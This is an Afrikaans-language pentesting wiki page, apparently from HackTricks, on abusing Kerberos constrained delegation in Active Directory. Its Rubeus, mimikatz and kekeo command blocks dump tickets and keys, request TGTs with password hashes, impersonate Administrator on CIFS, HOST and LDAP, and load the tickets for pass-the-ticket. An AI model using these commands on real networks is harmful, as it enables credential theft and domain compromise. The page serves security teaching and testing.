# Beperkte Afvaardiging

{{#include ../../banners/hacktricks-training.md}}

## Beperkte Afvaardiging

Deur dit kan 'n Domein administrateur **toelaat** dat 'n rekenaar **'n gebruiker of rekenaar naboots** teen 'n **diens** van 'n masjien.

- **Diens vir Gebruiker om self (**_**S4U2self**_**):** As 'n **diensrekening** 'n _userAccountControl_ waarde het wat [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) bevat, kan dit 'n TGS vir homself (die diens) verkry namens enige ander gebruiker.
- **Diens vir Gebruiker om Proxy(**_**S4U2proxy**_**):** 'n **diensrekening** kan 'n TGS verkry namens enige gebruiker na die diens wat in **msDS-AllowedToDelegateTo** gestel is. Om dit te doen, het dit eers 'n TGS van daardie gebruiker na homself nodig, maar dit kan S4U2self gebruik om daardie TGS te verkry voordat dit die ander een aanvra.

**Let wel**: As 'n gebruiker gemerk is as ‘_Rekening is sensitief en kan nie afgevaardig word_’ in AD, sal jy **nie in staat wees om** hulle te naboots nie.

Dit beteken dat as jy die **hash van die diens** kompromitteer, jy **gebruikers kan naboots** en **toegang** namens hulle tot die **diens geconfigureer** (moontlike **privesc**).

Boonop, jy **sal nie net toegang hê tot die diens wat die gebruiker kan naboots nie, maar ook tot enige diens** omdat die SPN (die diensnaam wat aangevra word) nie nagegaan word nie, net voorregte. Daarom, as jy toegang het tot **CIFS diens** kan jy ook toegang hê tot **HOST diens** met die `/altservice` vlag in Rubeus.

Ook, **LDAP diens toegang op DC**, is wat nodig is om 'n **DCSync** te benut.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Daar is **ander maniere om 'n TGT-kaartjie te verkry** of die **RC4** of **AES256** sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en onbeperkte delegasie, NTLM herlewing en misbruik van die Active Directory Sertifikaatdiens.
>
> **Net deur daardie TGT-kaartjie (of gehasht) te hê, kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromitteer.**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Meer inligting op ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
